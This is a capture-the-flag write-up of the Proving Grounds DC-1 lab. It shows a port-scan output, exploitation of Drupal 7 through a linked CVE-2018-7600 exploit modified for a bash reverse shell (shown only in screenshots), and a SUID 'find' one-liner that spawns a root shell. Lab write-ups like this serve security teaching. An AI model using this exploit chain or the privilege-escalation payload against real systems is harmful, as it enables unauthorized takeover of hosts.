------------------

### CTF: Proving Grounds
### Lab: DC-1

------------------

![image](https://github.com/user-attachments/assets/0ba0b5db-ceac-463b-9d9f-ca104ae5c6a3)

------------------

### RECONNAISSANCE

- Rustscan's network output scan

      ❯ rustscan -a 192.168.240.193 -- -Pn -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 192.168.240.193:22
      Open 192.168.240.193:80
      Open 192.168.240.193:111
      Open 192.168.240.193:51796
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 23:23 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 23:23
      Completed NSE at 23:23, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 23:23
      Completed NSE at 23:23, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 23:23
      Completed NSE at 23:23, 0.00s elapsed
      Initiating Parallel DNS resolution of 1 host. at 23:23
      Completed Parallel DNS resolution of 1 host. at 23:23, 0.00s elapsed
      DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 23:23
      Scanning 192.168.240.193 [4 ports]
      Discovered open port 22/tcp on 192.168.240.193
      Discovered open port 80/tcp on 192.168.240.193
      Discovered open port 111/tcp on 192.168.240.193
      Discovered open port 51796/tcp on 192.168.240.193
      Completed Connect Scan at 23:23, 0.13s elapsed (4 total ports)
      Initiating Service scan at 23:23
      Scanning 4 services on 192.168.240.193
      Completed Service scan at 23:24, 12.28s elapsed (4 services on 1 host)
      NSE: Script scanning 192.168.240.193.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 23:24
      Completed NSE at 23:24, 4.37s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 23:24
      Completed NSE at 23:24, 0.68s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 23:24
      Completed NSE at 23:24, 0.01s elapsed
      Nmap scan report for 192.168.240.193
      Host is up, received user-set (0.13s latency).
      Scanned at 2024-09-23 23:23:52 EDT for 18s
      
      PORT      STATE SERVICE REASON  VERSION
      22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
      | ssh-hostkey: 
      |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
      | ssh-dss AAAAB3NzaC1kc3MAAACBAI1NiSeZ5dkSttUT5BvkRgdQ0Ll7uF//UJCPnySOrC1vg62DWq/Dn1ktunFd09FT5Nm/ZP9BHlaW5hftzUdtYUQRKfazWfs6g5glPJQSVUqnlNwVUBA46qS65p4hXHkkl5QO0OHzs8dovwe3e+doYiHTRZ9nnlNGbkrg7yRFQLKPAAAAFQC5qj0MICUmhO3Gj+VCqf3aHsiRdQAAAIAoVp13EkVwBtQQJnS5mY4vPR5A9kK3DqAQmj4XP1GAn16r9rSLUFffz/ONrDWflFrmoPbxzRhpgNpHx9hZpyobSyOkEU3b/hnE/hdq3dygHLZ3adaFIdNVG4U8P9ZHuVUk0vHvsu2qYt5MJs0k1A+pXKFc9n06/DEU0rnNo+mMKwAAAIA/Y//BwzC2IlByd7g7eQiXgZC2pGE4RgO1pQCNo9IM4ZkV1MxH3/WVCdi27fjAbLQ+32cGIzjsgFhzFoJ+vfSYZTI+avqU0N86qT+mDCGCSeyAbOoNq52WtzWId1mqDoOzu7qG52HarRmxQlvbmtifYYTZCJWJcYla2GAsqUGFHw==
      |   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbDC/6BDEUIa7NP87jp5dQh/rJpDQz5JBGpFRHXa+jb5aEd/SgvWKIlMjUDoeIMjdzmsNhwCRYAoY7Qq2OrrRh2kIvQipyohWB8nImetQe52QG6+LHDKXiiEFJRHg9AtsgE2Mt9RAg2RvSlXfGbWXgobiKw3RqpFtk/gK66C0SJE4MkKZcQNNQeC5dzYtVQqfNh9uUb1FjQpvpEkOnCmiTqFxlqzHp/T1AKZ4RKED/ShumJcQknNe/WOD1ypeDeR+BUixiIoq+fR+grQB9GC3TcpWYI0IrC5ESe3mSyeHmR8yYTVIgbIN5RgEiOggWpeIPXgajILPkHThWdXf70fiv
      |   256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
      |_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKUNN60T4EOFHGiGdFU1ljvBlREaVWgZvgWlkhSKutr8l75VBlGbgTaFBcTzWrPdRItKooYsejeC80l5nEnKkNU=
      80/tcp    open  http    syn-ack Apache httpd 2.2.22 ((Debian))
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: Welcome to Drupal Site | Drupal Site
      |_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
      |_http-server-header: Apache/2.2.22 (Debian)
      | http-robots.txt: 36 disallowed entries 
      | /includes/ /misc/ /modules/ /profiles/ /scripts/ 
      | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
      | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
      | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
      | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
      | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
      | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
      |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
      |_http-generator: Drupal 7 (http://drupal.org)
      111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
      | rpcinfo: 
      |   program version    port/proto  service
      |   100000  2,3,4        111/tcp   rpcbind
      |   100000  2,3,4        111/udp   rpcbind
      |   100000  3,4          111/tcp6  rpcbind
      |   100000  3,4          111/udp6  rpcbind
      |   100024  1          45918/udp   status
      |   100024  1          51796/tcp   status
      |   100024  1          54854/udp6  status
      |_  100024  1          56450/tcp6  status
      51796/tcp open  status  syn-ack 1 (RPC #100024)
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- The http server on port `80` is running Drupal 7 which is vulnerable to an unauthenticated remote code [exploit](https://github.com/firefart/CVE-2018-7600).

![image](https://github.com/user-attachments/assets/9dfb1c30-4e5d-452b-b248-d874f4d73718)

- I tweaked the code and added my host and a bash reverse shell.

![image](https://github.com/user-attachments/assets/a9118207-80ad-4f07-ac8f-b06a3eccdf74)

- Reverse shell as `www-data`

![image](https://github.com/user-attachments/assets/9c56830c-38ae-4b19-8baf-ac971a69105f)

-----------------------------

### Privesc with FIND

- I ran `find / -perm -u=s -type f 2</dev/null` to check for binaries with the suid bit.I discovered that binary `find` has the suid bit.

![image](https://github.com/user-attachments/assets/c12991b8-5bca-43f5-ad26-2ff2131a4a30)

- I escalated privileges with the payload below

      find . -exec /bin/bash -p \; -quit

![image](https://github.com/user-attachments/assets/cd9b9fd1-da00-46c2-be0c-9cdafc82a94f)

- Root shell.......!!

![image](https://github.com/user-attachments/assets/58f6dca4-f9c2-4064-9e53-47b22cb816e6)

-----------------------

### THANKS FOR READING!!!

------------------------





